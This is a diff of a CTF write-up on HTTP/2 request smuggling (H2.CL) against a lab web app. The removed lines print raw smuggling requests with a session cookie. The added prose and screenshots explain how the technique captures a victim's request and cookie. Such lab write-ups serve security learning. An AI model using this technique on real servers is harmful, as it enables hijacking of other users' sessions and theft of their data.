@@ -386,80 +386,36 @@ One of the things that can go wrong in this conversion is that the **content len
 
 ### Exploit POC -
 
+We have 2 requests here to perform request smuggling.
+
+1. `/send_message`
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/44576a2c-135d-4158-8db9-0be05fac4f9d)
+
+2. `/getmMssages`
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/d811dd33-5d58-4871-9ead-4fccdcd85728)
+
+
 To confirm  H2.CL request smuggling, we first send the following request:
 
-```http
-POST /send_message HTTP/2
-Host: 10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 750
-Origin: https://10.10.65.138:80
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/6214534b-4a8e-4d94-b31f-2f40c2362db6)
 
+In the above image, we have sent  POST request to **/** with **Content-Length: 0** in **HTTP/2** is followed by a smuggled **GET /doesnotexist** request with a **Foo:** header, causing the server to treat Foo: as an invalid header for the next incoming request, thus rendering the smuggled request invalid and preventing it from executing correctly.
 
-data=test
+Upon sending subsequent request to **/** endpoint, we get a **404 Not found** response as the webserver tried to perform a GET request to **/doesnotexist** endpoint.
 
-POST /send_message HTTP/2
-Host:10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-Foo:
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/61f13589-89d4-4226-8775-ae851a39e9f3)
 
+This confirms we have a `H2.CL request smuggling` vulnerability.
 
-```
+To get the request sent by another user, we can send a smuggled request as follows:
 
-We get `503 Service Unavailable` response indicating it is a **Varnish cache server**.
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/98afdb99-afda-491a-90de-bea78112cecd)
 
-![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/eefb83d1-a5e5-4c50-8163-9f107020a200)
+The request will be in waiting state as the server expects a response content of length 800. Once the victim user performs any action, the request will get appended to our smuggled request & we will get a response of **503 Service Unavailable**.
 
-
-The above request has content length of 1000, so the server will wait for rest of the content to reach. `Foo: ` has been included in the smuggled request so that when the next request comes, it will be appened to it & thus get treated as an invalid header thereby doesn't cause any issues. Else our smuggled request would become invalid.
-
-- Without `Foo: ` header,our smuggled request would become invalid. This causes parsing issues because the second line doesn't fit the expected header format.
-
-```http
-GET /doesnotexist HTTP/1.1
-Host:10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-GET /getMessages HTTP/2
-Host: 10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://10.10.65.138:80/messages
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-```
-
-- Here, the Foo: header with an invalid value `GET /getMessages HTTP/2` will be treated as a malformed header by the server.
-
-```http
-GET /doesnotexist HTTP/1.1
-Host:10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-Foo: GET /getMessages HTTP/2
-Host: 10.10.65.138:80
-Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://10.10.65.138:80/messages
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Te: trailers
-```
-
-We first need to send the below smuggled request
-
-![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/b10af922-ce64-4f4b-88f1-4920e3f43ed9)
-
-Now, after few seconds, we we request the `/getMessages` endpoint, we can see the request made from Jack user. The cookie of Jack's account contains the flag.
+After a minute,we will get a response of **503 Service Unavailable** which indicates that victim has sent a request which has filled the remaining Content-Length of our smuggled request.Now when we request the `/getMessages` endpoint, we can see the request made from Jack user. The cookie of Jack's account contains the flag.
 
 ![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/6b514f84-310d-4742-92a1-da7784232bf6)
 
